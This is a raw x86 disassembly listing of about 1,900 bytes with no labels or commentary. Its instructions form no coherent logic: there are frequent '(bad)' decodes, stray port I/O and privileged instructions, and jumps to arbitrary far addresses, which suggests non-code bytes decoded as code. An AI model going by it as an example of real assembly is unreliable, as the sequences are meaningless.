  4127b6:	mov    ch,0xd4
  4127b8:	adc    esp,DWORD PTR [ecx+0x55]
  4127bb:	and    dl,BYTE PTR [edi]
  4127bd:	ret    0x1d73
  4127c0:	ins    DWORD PTR es:[edi],dx
  4127c1:	mov    ah,BYTE PTR [ebp+0x698278af]
  4127c7:	sbb    BYTE PTR [eax-0x7bb7d819],dh
  4127cd:	lahf   
  4127ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127cf:	xadd   DWORD PTR [edi+ebp*2-0x150af214],esp
  4127d7:	imul   edi,DWORD PTR [esi+eiz*2],0x20982a6c
  4127de:	xchg   edx,eax
  4127df:	mov    esp,0x492e00ba
  4127e4:	mov    ch,0xb5
  4127e6:	mov    edx,0xf63d6ca3
  4127eb:	es pushf 
  4127ed:	(bad)  
  4127ee:	ja     0x412813
  4127f0:	xor    eax,0x802bee92
  4127f5:	aam    0x80
  4127f7:	jbe    0xb46bc3be
  4127fd:	mov    bh,0x75
  4127ff:	test   BYTE PTR [esi-0x12],al
  412802:	cmp    DWORD PTR [esi-0xb684b25],0x5d
  412809:	call   0x1a47:0xea6f53da
  412810:	les    eax,FWORD PTR [eax+0x59]
  412813:	sub    DWORD PTR [ebp+0x4aef0702],0x4d17795f
  41281d:	or     ebx,0x47616419
  412823:	inc    ebp
  412824:	scas   al,BYTE PTR es:[edi]
  412825:	retf   0x37ec
  412828:	icebp  
  412829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41282a:	nop
  41282b:	inc    esi
  41282c:	add    eax,DWORD PTR [edi-0x5b]
  41282f:	loopne 0x412851
  412831:	ficom  WORD PTR [eax+0x69]
  412834:	not    DWORD PTR [ebx]
  412836:	sti    
  412837:	jge    0x4127bc
  412839:	dec    ebp
  41283a:	mov    ds:0x22baf23f,al
  41283f:	jns    0x4128b5
  412841:	jno    0x41287a
  412843:	test   eax,0xb7623bac
  412848:	jbe    0x412831
  41284a:	fnsave [esi-0x30]
  41284d:	mov    cs,WORD PTR [ecx+0x1f]
  412850:	jmp    0xdb82d0f4
  412855:	aas    
  412856:	sub    al,0x42
  412858:	or     BYTE PTR [ebx],al
  41285a:	ficomp WORD PTR [ecx]
  41285c:	inc    esp
  41285d:	inc    edx
  41285e:	sbb    eax,0x6faf5e42
  412863:	addr16 push ss
  412865:	enter  0xf5c5,0x34
  412869:	test   DWORD PTR [edi-0x40],edi
  41286c:	mov    ah,0x8
  41286e:	add    DWORD PTR [edi+0x1],ecx
  412871:	sub    esi,DWORD PTR [ebp-0x10]
  412874:	cmp    ecx,DWORD PTR [esi-0x4a]
  412877:	inc    esi
  412878:	into   
  412879:	repz ds dec ebx
  41287c:	mov    eax,ds:0x8d8aef0e
  412881:	dec    edi
  412882:	les    ebx,FWORD PTR [esi+0x5a582b56]
  412888:	mov    ecx,0x25778633
  41288d:	popf   
  41288e:	mov    edx,esi
  412890:	xor    ch,BYTE PTR [ecx+0x12]
  412893:	adc    edi,DWORD PTR [ebx*1+0x1548f36e]
  41289a:	add    bl,bl
  41289c:	imul   ecx,DWORD PTR [ecx-0x2ed08f99],0xeaef75a6
  4128a6:	aas    
  4128a7:	sub    eax,0x8391c5fe
  4128ac:	cmp    al,0xbf
  4128ae:	sbb    ebp,DWORD PTR [edx+0x309fb234]
  4128b4:	stos   DWORD PTR es:[edi],eax
  4128b5:	mov    edi,0x661c7f63
  4128ba:	lea    eax,[edi-0x58]
  4128bd:	pop    ss
  4128be:	pop    ss
  4128bf:	fstp   TBYTE PTR [edi]
  4128c1:	jne    0x412894
  4128c3:	ja     0x4128b9
  4128c5:	xchg   esp,eax
  4128c6:	inc    ebp
  4128c7:	inc    esi
  4128c8:	fidiv  DWORD PTR [ecx+ecx*4+0x70]
  4128cc:	cli    
  4128cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ce:	sub    bl,dl
  4128d0:	xor    DWORD PTR [eax-0x7a],edx
  4128d3:	jae    0x4128a6
  4128d5:	xor    eax,0x8934533b
  4128da:	fcmovnu st,st(3)
  4128dc:	or     eax,0xcbf26c6
  4128e1:	mov    al,ds:0x98bcc4cd
  4128e6:	lods   eax,DWORD PTR ds:[esi]
  4128e7:	out    0xcd,eax
  4128e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ea:	sti    
  4128eb:	loop   0x4128bd
  4128ed:	lods   eax,DWORD PTR ds:[esi]
  4128ee:	call   0x1a61:0x16bd6e1d
  4128f5:	pop    eax
  4128f6:	(bad)  
  4128f7:	cmp    ebp,DWORD PTR [ebx]
  4128f9:	clc    
  4128fa:	mov    al,ds:0x713c30ec
  4128ff:	xchg   edi,eax
  412900:	cwde   
  412901:	das    
  412902:	mov    eax,DWORD PTR gs:[edx-0x278f5f36]
  412909:	in     eax,0x70
  41290b:	outs   dx,BYTE PTR ds:[esi]
  41290c:	jge    0x41291a
  41290e:	clc    
  41290f:	int3   
  412910:	inc    DWORD PTR [ebx]
  412912:	jg     0x4128d2
  412914:	mov    esp,0x9ebf4542
  412919:	fdiv   QWORD PTR [esi]
  41291b:	push   ds
  41291c:	loopne 0x4128a6
  41291e:	xchg   ebx,eax
  41291f:	std    
  412920:	pop    ecx
  412921:	dec    esp
  412922:	retf   0x8596
  412925:	pop    ebx
  412926:	add    DWORD PTR [esi],edx
  412928:	xlat   BYTE PTR ds:[ebx]
  412929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41292a:	mov    ch,0xff
  41292c:	push   eax
  41292d:	or     al,0x3f
  41292f:	sbb    DWORD PTR [edi],0x81ea097
  412935:	nop
  412936:	aad    0x33
  412938:	hlt    
  412939:	test   DWORD PTR [edi+0x4633b5a8],esp
  41293f:	pop    ebx
  412940:	inc    edi
  412941:	jno    0x4128d6
  412943:	in     al,0x8c
  412945:	dec    ebp
  412946:	jmp    0xc6aee43f
  41294b:	push   0xf9b5a579
  412950:	and    BYTE PTR [ecx],ch
  412952:	repz pop ss
  412954:	push   ds
  412955:	and    esi,ebp
  412957:	scas   eax,DWORD PTR es:[edi]
  412958:	test   ah,dl
  41295a:	outs   dx,BYTE PTR ds:[esi]
  41295b:	add    ah,BYTE PTR [edi+ecx*8+0x1afc81c2]
  412962:	aad    0xe9
  412964:	arpl   WORD PTR [ebx],sp
  412966:	push   0xdfb83bfb
  41296b:	aas    
  41296c:	sub    esp,DWORD PTR [edi]
  41296e:	jg     0x41297a
  412970:	repz xor ch,BYTE PTR ds:0x425fc313
  412977:	mov    ebx,ss
  412979:	out    dx,al
  41297a:	iret   
  41297b:	add    eax,0xe7547fa4
  412980:	(bad)  [ebx]
  412982:	sub    DWORD PTR [eax*1+0x1c5bb4fe],ecx
  412989:	xchg   cl,bl
  41298b:	xor    eax,0xc75a2766
  412990:	retf   
  412991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412992:	pop    edx
  412993:	xchg   DWORD PTR [ebp+0x23],edx
  412996:	stc    
  412997:	or     ebp,ecx
  412999:	mov    bh,0x88
  41299b:	retf   
  41299c:	enter  0xbea4,0x23
  4129a0:	ror    bl,cl
  4129a2:	xor    ah,bh
  4129a4:	leave  
  4129a5:	jns    0x4129db
  4129a7:	ins    DWORD PTR es:[edi],dx
  4129a8:	(bad)  
  4129aa:	mov    bh,dh
  4129ac:	dec    al
  4129ae:	add    bh,BYTE PTR [esi+0x3b5c2730]
  4129b4:	push   ss
  4129b5:	cmp    ah,BYTE PTR ss:[esi+0x48]
  4129b9:	adc    al,0x61
  4129bb:	mov    eax,ebx
  4129bd:	shl    BYTE PTR [esi-0x36],1
  4129c0:	adc    al,0x90
  4129c2:	hlt    
  4129c3:	fbld   TBYTE PTR [ecx]
  4129c5:	loopne 0x4129ad
  4129c7:	push   esi
  4129c8:	sub    BYTE PTR [edx+0x50af4a60],al
  4129ce:	mov    dh,0xa7
  4129d0:	int3   
  4129d1:	mov    ecx,0xb9424bf3
  4129d6:	dec    ebp
  4129d7:	and    cl,al
  4129d9:	and    dl,BYTE PTR [eax-0x1b7fa849]
  4129df:	pop    eax
  4129e0:	in     al,dx
  4129e1:	adc    DWORD PTR [edi],esp
  4129e3:	and    edi,edx
  4129e5:	and    DWORD PTR [esi+0x3f],esp
  4129e8:	icebp  
  4129e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ea:	push   edi
  4129eb:	test   eax,0x3e8b2b75
  4129f0:	pop    edi
  4129f1:	adc    ch,BYTE PTR [ebp+0x4bbb4e9c]
  4129f7:	or     ch,BYTE PTR [edi+ebx*4]
  4129fa:	fbstp  TBYTE PTR [esi-0x7415f97b]
  412a00:	imul   edi,DWORD PTR [edx-0x316b03b3],0x7b79de75
  412a0a:	test   al,0x5
  412a0c:	ins    DWORD PTR es:[edi],dx
  412a0d:	scas   al,BYTE PTR es:[edi]
  412a0e:	push   ecx
  412a0f:	mov    dh,0xb2
  412a11:	jnp    0x4129f9
  412a13:	sub    al,0xf8
  412a15:	into   
  412a16:	fwait
  412a17:	jne    0x4129f6
  412a19:	sub    BYTE PTR [edx],0xb1
  412a1c:	popa   
  412a1d:	add    al,0x21
  412a1f:	int    0x30
  412a21:	ret    
  412a22:	test   al,0x75
  412a24:	arpl   WORD PTR [ebp+0x2],dx
  412a27:	jbe    0x4129c0
  412a29:	adc    al,0x76
  412a2b:	mov    esp,0xfbedce3d
  412a30:	cmp    ebx,edx
  412a32:	or     DWORD PTR [esi+0x23],ebx
  412a35:	cdq    
  412a36:	push   cs
  412a37:	out    0x8f,al
  412a39:	sbb    cl,bh
  412a3b:	cmp    DWORD PTR [ecx-0x12adfe4d],eax
  412a41:	out    dx,al
  412a42:	loope  0x412ab0
  412a44:	inc    edi
  412a45:	adc    edi,ebx
  412a47:	push   0x5e265338
  412a4c:	fnstenv [bp+di+0x4e]
  412a50:	js     0x4129fb
  412a52:	or     edx,esi
  412a54:	aaa    
  412a55:	stos   BYTE PTR es:[edi],al
  412a56:	dec    esp
  412a57:	das    
  412a58:	pop    ss
  412a59:	cmp    ebx,edx
  412a5b:	rol    BYTE PTR [ecx],0xc9
  412a5e:	pop    es
  412a5f:	mov    cl,0x7e
  412a61:	or     al,0xf8
  412a63:	imul   ebp,edi,0xffffff93
  412a66:	sub    BYTE PTR [ebp-0x1],ah
  412a69:	push   eax
  412a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a6b:	add    esp,DWORD PTR [ebp-0x3b0774e0]
  412a71:	mov    dl,0x62
  412a73:	xchg   BYTE PTR [esi+0x49],cl
  412a76:	xchg   esi,eax
  412a77:	pop    ss
  412a78:	pop    ds
  412a79:	mov    dl,BYTE PTR [ebx+edi*4+0x1c8214f0]
  412a80:	dec    edi
  412a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a82:	fild   QWORD PTR [ecx+0x3]
  412a85:	pop    ds
  412a86:	sub    ecx,DWORD PTR [ecx+0x39b3c76a]
  412a8c:	movsx  edx,WORD PTR [ebx+0x55]
  412a90:	adc    DWORD PTR [esi],eax
  412a92:	xor    eax,0xec830c93
  412a97:	xchg   ebp,eax
  412a98:	imul   edx,DWORD PTR [esi-0x5f],0x13
  412a9c:	push   edi
  412a9d:	stos   DWORD PTR es:[edi],eax
  412a9e:	pop    edx
  412a9f:	mov    ds:0xe1628d8f,eax
  412aa4:	fs jnp 0x412a55
  412aa7:	pop    esp
  412aa8:	aam    0x12
  412aaa:	sbb    ebp,DWORD PTR [ebx]
  412aac:	es xor eax,0xe047f3d4
  412ab2:	iret   
  412ab3:	loopne 0x412a5f
  412ab5:	or     al,0xb9
  412ab7:	loope  0x412a62
  412ab9:	inc    edx
  412aba:	or     edx,DWORD PTR [edx-0x52b313d1]
  412ac0:	call   0x26bc:0xfcfbe054
  412ac7:	ror    ecx,0x76
  412aca:	adc    ch,BYTE PTR [edi]
  412acc:	xchg   esp,eax
  412acd:	xchg   esp,eax
  412ace:	sub    al,0x4b
  412ad0:	out    dx,eax
  412ad1:	or     BYTE PTR [edi+ebx*4],ch
  412ad4:	mov    eax,0x6650dfe7
  412ad9:	das    
  412ada:	das    
  412adb:	push   cs
  412adc:	out    dx,al
  412add:	adc    edi,DWORD PTR [edi+ebp*4+0x5415a9ec]
  412ae4:	int3   
  412ae5:	and    DWORD PTR [edi+0x18],esi
  412ae8:	adc    dl,BYTE PTR [ebx-0x2ca0fdf9]
  412aee:	mov    eax,0xf86fbaae
  412af3:	or     esp,DWORD PTR [edx]
  412af5:	jae    0x412ae4
  412af7:	jecxz  0x412a9d
  412af9:	aas    
  412afa:	add    ah,BYTE PTR [ebx]
  412afc:	pop    esp
  412afd:	mov    al,ds:0xe7a9c5e5
  412b02:	call   0x36844d03
  412b07:	(bad)  
  412b08:	jbe    0x412b2f
  412b0a:	cs cli 
  412b0c:	jl     0x412ac3
  412b0e:	jmp    0xe3fc:0x39e56f6d
  412b15:	popa   
  412b16:	iret   
  412b17:	das    
  412b18:	sbb    al,cl
  412b1a:	pop    ss
  412b1b:	bound  esi,QWORD PTR [ebx]
  412b1d:	push   eax
  412b1e:	or     edi,DWORD PTR [ebp+0x59887411]
  412b24:	push   0xc74d4c2d
  412b29:	fimul  WORD PTR [ebx]
  412b2b:	sbb    eax,0x8d096934
  412b30:	sub    DWORD PTR [ebx+ebx*2],esp
  412b33:	lods   eax,DWORD PTR ds:[esi]
  412b34:	loopne 0x412b64
  412b36:	fiadd  DWORD PTR [eax+0x73a066fc]
  412b3c:	loop   0x412b1c
  412b3e:	jnp    0x412b3f
  412b40:	sti    
  412b41:	(bad)  
  412b43:	xor    DWORD PTR ds:0xebd13e9f,0xffffffb3
  412b4a:	lahf   
  412b4b:	xchg   ecx,eax
  412b4c:	mov    BYTE PTR [edx],ah
  412b4e:	loope  0x412b7d
  412b50:	and    BYTE PTR es:[edx-0x63eb3696],bl
  412b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b58:	jg     0x412b4b
  412b5a:	out    dx,eax
  412b5b:	loopne 0x412b45
  412b5d:	repz lock js 0x412b9d
  412b61:	sbb    al,0xdf
  412b63:	ffree  st(6)
  412b65:	(bad)  
  412b66:	pop    ecx
  412b67:	out    0x25,al
  412b69:	add    eax,0x5b2b0311
  412b6e:	js     0x412b33
  412b70:	xchg   ebx,eax
  412b71:	mov    ecx,0x5569eedf
  412b76:	jge    0x412b13
  412b78:	adc    esp,DWORD PTR [edi-0x4f]
  412b7b:	dec    eax
  412b7c:	loopne 0x412b28
  412b7e:	test   DWORD PTR [ebp-0x301f02d6],0xac764c34
  412b88:	pop    edx
  412b89:	xor    dh,BYTE PTR [eax+esi*1]
  412b8c:	jg     0x412b8f
  412b8e:	pop    edi
  412b8f:	pop    ebx
  412b90:	mov    ebp,0x771630b9
  412b95:	repnz iret 
  412b97:	pop    esp
  412b98:	and    DWORD PTR [eax+ebp*1],ebp
  412b9b:	mov    WORD PTR [edi-0x5074f0ae],?
  412ba1:	sbb    al,ah
  412ba3:	xor    al,0x51
  412ba5:	and    ebx,DWORD PTR [eax]
  412ba7:	sbb    dl,BYTE PTR [ecx+0x6e]
  412baa:	cs aam 0xca
  412bad:	push   esi
  412bae:	jno    0x412b97
  412bb0:	sub    ecx,ecx
  412bb2:	adc    BYTE PTR [esi+ecx*8-0x2aeda439],ch
  412bb9:	ficomp DWORD PTR es:[eax]
  412bbc:	jae    0x412bff
  412bbe:	dec    ebx
  412bbf:	ret    0x8add
  412bc2:	test   al,0x9a
  412bc4:	sub    ecx,edi
  412bc6:	popf   
  412bc7:	add    al,0x4d
  412bc9:	xchg   ebp,eax
  412bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bcb:	pop    eax
  412bcc:	sbb    eax,0x85f915e3
  412bd1:	fldcw  WORD PTR [esi+ebx*4]
  412bd4:	cdq    
  412bd5:	ret    0x534f
  412bd8:	sti    
  412bd9:	out    dx,al
  412bda:	mov    ch,0xa0
  412bdc:	scas   eax,DWORD PTR es:[edi]
  412bdd:	mov    esp,0x9225a9ac
  412be2:	add    eax,0xd4956977
  412be7:	es xchg esp,eax
  412be9:	daa    
  412bea:	mov    ebx,0x5db547c5
  412bef:	aaa    
  412bf0:	mov    edx,0xaf76acb4
  412bf5:	xchg   ebx,eax
  412bf6:	sbb    BYTE PTR [esi-0x46],0x7b
  412bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bfb:	ja     0x412bd1
  412bfd:	lods   al,BYTE PTR ds:[esi]
  412bfe:	xchg   esp,eax
  412bff:	cdq    
  412c00:	add    esi,DWORD PTR [edi+0x5e47a5ae]
  412c06:	and    bh,BYTE PTR [ecx-0x10b0835]
  412c0c:	adc    dh,ch
  412c0e:	rol    ebp,1
  412c10:	loopne 0x412bbe
  412c12:	sub    eax,0xf7524a83
  412c17:	push   cs
  412c18:	pop    eax
  412c19:	retf   0x2931
  412c1c:	xchg   edx,eax
  412c1d:	and    ebp,ecx
  412c1f:	popa   
  412c20:	outs   dx,BYTE PTR ds:[esi]
  412c21:	xor    eax,0x2e1b0a55
  412c26:	dec    edi
  412c27:	ds sbb eax,0xb5db2ff7
  412c2d:	(bad)  
  412c2e:	clc    
  412c2f:	or     esp,0xf8737b0b
  412c35:	jmp    0x3669:0x77ac714c
  412c3c:	in     eax,0x89
  412c3e:	inc    ebp
  412c3f:	rcr    esi,1
  412c41:	test   al,0x1e
  412c43:	mov    ss,WORD PTR [edi+0x74]
  412c46:	push   ebp
  412c47:	mov    dl,0x40
  412c49:	(bad)  
  412c4a:	push   edi
  412c4b:	pop    ss
  412c4c:	pop    edx
  412c4d:	std    
  412c4e:	push   0xffffffed
  412c50:	rcl    dl,cl
  412c52:	data16 jecxz 0x412c05
  412c55:	inc    esp
  412c56:	leave  
  412c57:	dec    edx
  412c58:	pop    ds
  412c59:	jne    0x412c3f
  412c5b:	sub    eax,DWORD PTR [ebx]
  412c5d:	scas   al,BYTE PTR es:[edi]
  412c5e:	out    dx,eax
  412c5f:	sar    DWORD PTR [ebx],1
  412c61:	add    cl,BYTE PTR [ecx-0x7540bb2]
  412c67:	sti    
  412c68:	dec    ebx
  412c69:	arpl   WORD PTR [eax],bp
  412c6b:	sub    eax,0xb0491816
  412c70:	xchg   esi,eax
  412c71:	sbb    DWORD PTR [edx+0x78],ebp
  412c74:	ret    0xf2ba
  412c77:	ins    BYTE PTR es:[edi],dx
  412c78:	inc    ecx
  412c79:	push   edx
  412c7a:	ins    DWORD PTR es:[edi],dx
  412c7b:	cld    
  412c7c:	push   0xa473f82f
  412c81:	shr    BYTE PTR [bx+si+0x5a],1
  412c85:	jge    0x412c3a
  412c87:	pop    edx
  412c88:	xor    esp,eax
  412c8a:	sti    
  412c8b:	mov    edx,0x92305a0e
  412c90:	mov    esp,0xdba8118a
  412c95:	cs and al,0xa1
  412c98:	outs   dx,DWORD PTR ds:[esi]
  412c99:	aaa    
  412c9a:	dec    eax
  412c9b:	bnd jp 0x412c49
  412c9e:	test   eax,0xaad01cd6
  412ca3:	lods   al,BYTE PTR ds:[esi]
  412ca4:	je     0x412c56
  412ca6:	pop    es
  412ca7:	add    BYTE PTR [edx+0x1f],ah
  412caa:	cmp    ebx,DWORD PTR [ecx-0x4097c947]
  412cb0:	cmp    cl,BYTE PTR [edi+0x6ed2f069]
  412cb6:	fimul  DWORD PTR [edi+0x65]
  412cb9:	mov    al,0xf6
  412cbb:	mov    ebp,0x4969ca41
  412cc0:	mov    cl,0xfe
  412cc2:	jo     0x412cf6
  412cc4:	push   ecx
  412cc5:	std    
  412cc6:	fwait
  412cc7:	mov    es:0xcdbf44df,al
  412ccd:	jecxz  0x412d1b
  412ccf:	and    bh,BYTE PTR [ecx+0x6e]
  412cd2:	bound  ebx,QWORD PTR [ebx+0xb43a9be]
  412cd8:	add    eax,0x601a75c3
  412cdd:	enter  0x2392,0xa2
  412ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce2:	jo     0x412cd9
  412ce4:	(bad)  [esi+esi*1+0x6bd6ad05]
  412ceb:	imul   esi,DWORD PTR [esi],0x81b43683
  412cf1:	fnsave [eax+0x39]
  412cf4:	dec    ebp
  412cf5:	int    0x77
  412cf7:	fsub   DWORD PTR [ebx+0x4f]
  412cfa:	dec    esp
  412cfb:	pshufw mm4,mm6,0x9f
  412cff:	cdq    
  412d00:	test   esi,0xa8e0719f
  412d06:	hlt    
  412d07:	ror    BYTE PTR [ebp-0x1a],cl
  412d0a:	dec    ebx
  412d0b:	cmp    eax,0x95faf5f1
  412d10:	test   eax,0xac83003b
  412d15:	sti    
  412d16:	jmp    0x267153d1
  412d1b:	mov    ds:0x1e90b89d,eax
  412d20:	push   ebp
  412d21:	loopne 0x412d29
  412d23:	aad    0xab
  412d25:	or     BYTE PTR [ecx],ah
  412d27:	pop    edx
  412d28:	test   eax,0x5189e5df
  412d2d:	cmp    bl,BYTE PTR [ecx]
  412d2f:	clc    
  412d30:	out    dx,eax
  412d31:	mov    esi,0xac651e81
  412d36:	loope  0x412da5
  412d38:	jg     0x412da3
  412d3a:	out    dx,eax
  412d3b:	lods   eax,DWORD PTR ds:[esi]
  412d3c:	and    ecx,edi
  412d3e:	dec    ecx
  412d3f:	aad    0xf8
  412d41:	ds push edx
  412d43:	(bad)  [eax+0x6b103d84]
  412d49:	mov    ah,0x45
  412d4b:	xchg   ecx,eax
  412d4c:	xchg   edi,eax
  412d4d:	and    DWORD PTR [esi+ebp*2-0x21],ebp
  412d51:	dec    ecx
  412d52:	and    bh,al
  412d54:	aam    0xdb
  412d56:	xor    bl,BYTE PTR [ecx+0x24]
  412d59:	jo     0x412d11
  412d5b:	xchg   esp,eax
  412d5c:	ror    cl,0x25
  412d5f:	ds push eax
  412d61:	jge    0x412dc9
  412d63:	arpl   WORD PTR [esi+0x70],bp
  412d66:	std    
  412d67:	sub    eax,0xbd187496
  412d6c:	sub    eax,0x3836b08d
  412d71:	push   ebx
  412d72:	dec    edi
  412d73:	(bad)  
  412d75:	mov    ecx,0x5ea03f07
  412d7a:	add    BYTE PTR ds:0xffb06f09,cl
  412d80:	mov    ax,ds:0x6d7d0cb8
  412d86:	sbb    al,0xe
  412d88:	pcmpgtb mm1,QWORD PTR ds:0x685a89c1
  412d8f:	mov    bh,0x86
  412d91:	(bad)
  412d94:	inc    esi
  412d95:	ins    BYTE PTR es:[edi],dx
  412d96:	pop    ecx
  412d97:	adc    al,0x7b
  412d99:	push   edi
  412d9a:	inc    esi
  412d9b:	xor    eax,0x946ad32d
  412da0:	mov    ch,0xc2
  412da2:	xchg   ebp,eax
  412da3:	jg     0x412dea
  412da5:	mov    cl,0xd5
  412da7:	sbb    al,0x80
  412da9:	pop    esp
  412daa:	jbe    0x412d45
  412dac:	xor    eax,0x41d0e1e0
  412db1:	mov    ds:0x52148f68,al
  412db6:	scas   eax,DWORD PTR es:[edi]
  412db7:	xor    DWORD PTR [edx],esi
  412db9:	(bad)  
  412dba:	out    0xf1,al
  412dbc:	std    
  412dbd:	fild   QWORD PTR [ecx+edi*1+0x2a]
  412dc1:	dec    ecx
  412dc2:	jge    0x412dcb
  412dc4:	xchg   ecx,eax
  412dc5:	jle    0x412d86
  412dc7:	out    dx,al
  412dc8:	daa    
  412dc9:	test   al,0x27
  412dcb:	xchg   esp,eax
  412dcc:	popf   
  412dcd:	push   0xe5776dad
  412dd2:	jecxz  0x412dbf
  412dd4:	ds jb  0x412da8
  412dd7:	test   al,0xa3
  412dd9:	shr    BYTE PTR [ebx+eax*2],cl
  412ddc:	out    dx,al
  412ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dde:	mov    edi,0x7d0db365
  412de3:	inc    eax
  412de4:	scas   eax,DWORD PTR es:[edi]
  412de5:	sub    bh,0x9e
  412de8:	lods   eax,DWORD PTR ds:[esi]
  412de9:	or     eax,0xeb5e4d70
  412dee:	shl    BYTE PTR ds:[eax+0x6a],cl
  412df2:	and    WORD PTR [edx+0x2c],ax
  412df6:	int3   
  412df7:	pop    es
  412df8:	cmp    eax,0xf4776047
  412dfd:	ret    
  412dfe:	(bad)  
  412dff:	ror    BYTE PTR [edi+ebp*8-0x7a],cl
  412e03:	mov    bl,0x54
  412e05:	and    DWORD PTR [eax+edx*2],0x75801728
  412e0c:	int    0x9d
  412e0e:	neg    DWORD PTR [edx+0x6b]
  412e11:	push   0x25
  412e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e14:	push   ss
  412e15:	xor    ah,bh
  412e17:	pop    ebx
  412e18:	inc    esi
  412e19:	mov    ecx,fs
  412e1b:	enter  0x7b44,0xc
  412e1f:	mov    al,0x96
  412e21:	mov    BYTE PTR [esp+eax*8-0x1217e6f2],ch
  412e28:	(bad)  
  412e29:	leave  
  412e2a:	xchg   BYTE PTR [ebx],dl
  412e2c:	xchg   ebx,eax
  412e2d:	mov    esi,0xb0b6da9
  412e32:	jle    0x412de0
  412e34:	push   ss
  412e35:	test   BYTE PTR [ecx-0x5f66883f],bh
  412e3b:	and    BYTE PTR [ecx],dl
  412e3d:	mov    al,0xe7
  412e3f:	sti    
  412e40:	rcr    BYTE PTR [eax],1
  412e42:	loopne 0x412eb2
  412e44:	sbb    DWORD PTR [edx-0x43],esi
  412e47:	stc    
  412e48:	sub    eax,0xab255766
  412e4d:	xor    al,0x74
  412e4f:	fsubr  st(3),st
  412e51:	fs sti 
  412e53:	pop    edi
  412e54:	sbb    BYTE PTR [edi],dl
  412e56:	jbe    0x412df1
  412e58:	dec    ecx
  412e59:	cmp    al,0x11
  412e5b:	push   ecx
  412e5c:	push   eax
  412e5d:	(bad)  
  412e5f:	or     DWORD PTR [esi-0x53],0xffffff91
  412e63:	imul   ecx,DWORD PTR [ebx+ebx*2],0x70f610be
  412e6a:	cli    
  412e6b:	mov    WORD PTR [edi+0x75],fs
  412e6e:	sub    al,0xeb
  412e70:	scas   eax,DWORD PTR es:[edi]
  412e71:	sub    cl,BYTE PTR [eax-0x38]
  412e74:	outs   dx,DWORD PTR ds:[esi]
  412e75:	cmp    BYTE PTR [ecx-0xf7e3814],ah
  412e7b:	sahf   
  412e7c:	pop    eax
  412e7d:	sub    DWORD PTR [ecx],eax
  412e7f:	add    BYTE PTR [edx+0x24],bl
  412e82:	adc    al,0xad
  412e84:	outs   dx,DWORD PTR ds:[esi]
  412e85:	aad    0x81
  412e87:	cli    
  412e88:	js     0x412eef
  412e8a:	sahf   
  412e8b:	pop    ds
  412e8c:	xor    BYTE PTR [eax],ch
  412e8e:	das    
  412e8f:	hlt    
  412e90:	pop    esi
  412e91:	mov    WORD PTR [edx+0x7aebb583],ds
  412e97:	dec    edi
  412e98:	gs xor al,0x0
  412e9b:	mov    al,ds:0x8a511a83
  412ea0:	mov    ecx,0x63f797f1
  412ea5:	and    BYTE PTR [ebx-0x3dd7ab05],0x10
  412eac:	mov    ds:0x6a23de47,eax
  412eb1:	pop    esi
  412eb2:	fninit 
  412eb4:	in     eax,dx
  412eb5:	sbb    ah,dl
  412eb7:	pushf  
  412eb8:	mov    dh,0xd0
  412eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ebb:	and    DWORD PTR [edi+edx*4-0x20],edx
  412ebf:	lea    esi,[edi]
  412ec1:	cmp    edi,DWORD PTR [ebx]
  412ec3:	or     ch,BYTE PTR [edi]
  412ec5:	jne    0x412eb7
  412ec7:	rol    DWORD PTR [edi+esi*1+0x59feb337],1
  412ece:	addr16 (bad) 
  412ed0:	cmp    eax,0x2d5c3
  412ed5:	mov    eax,0xf5e90c6c
  412eda:	dec    esi
  412edb:	lods   eax,DWORD PTR ds:[esi]
  412edc:	pop    edi
  412edd:	inc    esp
  412ede:	aad    0x83
  412ee0:	xchg   ebx,eax
  412ee1:	loope  0x412f4f
  412ee3:	pushf  
  412ee4:	mov    esi,0xb80edd17
  412ee9:	iret   
  412eea:	(bad)  
  412eeb:	leave  
  412eec:	mov    bh,0x3e
  412eee:	jo     0x412eb0
  412ef0:	lea    edx,[esi+0x7]
  412ef3:	and    BYTE PTR [ebx+0x3ad66ea3],0x34
  412efa:	adc    BYTE PTR [edi+0x2d35faa1],cl
  412f00:	test   dl,bl
  412f02:	push   eax
  412f03:	xor    ebx,DWORD PTR [ecx-0x1cc40d18]
  412f09:	scas   eax,DWORD PTR es:[edi]
  412f0a:	xchg   eax,ecx
  412f0c:	xchg   edx,eax
  412f0d:	(bad)  
  412f0e:	fistp  DWORD PTR [ebx-0x65b4e9cd]
  412f14:	or     BYTE PTR [esp+edi*2],0x33
  412f18:	popa   
  412f19:	xor    BYTE PTR [edi+0x48cba224],bl
  412f1f:	add    edx,DWORD PTR [ecx+edx*2-0x64]
  412f23:	js     0x412f13
  412f25:	cmp    esi,edi
  412f27:	jmp    0xd4c91ff9
  412f2c:	and    DWORD PTR gs:[ecx],ebp
  412f2f:	imul   edi,DWORD PTR [ecx+0x58701c93],0x44f7f4f5
  412f39:	ds int3 
  412f3b:	xchg   BYTE PTR [ecx],ch
  412f3d:	es sahf 
  412f3f:	add    cl,BYTE PTR [esi+0x1073ca57]
  412f45:	mov    ecx,0x8e51f75e
  412f4a:	push   esi
  412f4b:	mov    esi,0xeeb40f15
  412f50:	cmc    
  412f51:	fiadd  WORD PTR [eax+0x3025cf35]
  412f57:	rol    DWORD PTR [ebp+0x45],0x9e
  412f5b:	inc    esi
  412f5c:	xchg   BYTE PTR [esi+0x550c6458],ch
  412f62:	mov    ebx,0xac7d11b9
  412f67:	inc    eax
  412f68:	jg     0x412f68
  412f6a:	stos   BYTE PTR es:[edi],al
  412f6b:	ss out dx,al
  412f6d:	outs   dx,DWORD PTR ds:[esi]
